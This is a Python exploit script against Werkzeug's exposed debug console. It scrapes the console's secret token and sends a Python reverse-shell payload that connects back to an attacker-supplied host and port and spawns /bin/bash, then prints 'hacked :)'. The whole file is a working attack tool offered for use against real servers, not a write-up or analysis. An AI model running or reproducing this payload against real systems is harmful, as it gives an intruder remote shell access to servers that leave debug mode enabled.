import requests
import hashlib
import re
import sys
import base64
import argparse
import lxml.html
import lxml.etree
from log_colors import *

# Werkzeug reverse shell
class WerkzeugRevSh:

    def __init__(self, url, lhost, lport):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.console_url = url.rstrip("/") + "/console"
        self.lhost, self.lport = lhost, lport
        self.session = requests.Session()

    # check debug is enable or not
    def debug_check(self):
        print (LogColors.BLUE + "check debug..." + LogColors.ENDC)
        r = self.session.get(self.console_url)
        if "Werkzeug" in r.text:
            print (LogColors.GREEN + "debug enabled..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "debug is not enabled :(" + LogColors.ENDC)
            sys.exit()
    
    # get secret token
    def get_secret(self):
        print (LogColors.BLUE + "get secret..." + LogColors.ENDC)
        r = self.session.get(self.console_url)
        secret = re.findall("[0-9a-zA-Z]{20}", r.text)
        if secret:
            self.secret = secret[0]
            print (LogColors.YELLOW + "secret: " + secret + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed parse secret..." + LogColors.ENDC)
            sys.exit()

    # exploit: get reverse shell
    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        self.debug_check()
        self.get_secret()
        cmd = 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
        cmd += 's.connect(("{}", {}));'.format(self.lhost, self.lport)
        cmd += 'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
        cmd += 'pty.spawn("/bin/bash")'''
        data = {
            "__debugger__" : "yes",
            "cmd" : str(cmd),
            "frm" : '0',
            "s" : self.secret,
        }
        try:
            r = self.session.get(self.console_url, params = data)
            print (LogColors.GREEN + "successfully get rev shell. hacked :)" + LogColors.ENDC)
            print (LogColors.GREEN + r.text + LogColors.ENDC)
        except Exception as e:
            print (LogColors.RED + "rev shell failed :(" + LogColors.ENDC)
            sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-l','--lhost', required = True, help = "rev shell host")
    parser.add_argument('-p','--lport', required = True, help = "rev shell port")
    args = vars(parser.parse_args())
    url = args["url"]
    host, port = args['lhost'], args['lport']
    cve = WerkzeugRevSh(url, host, port)
    cve.exploit()

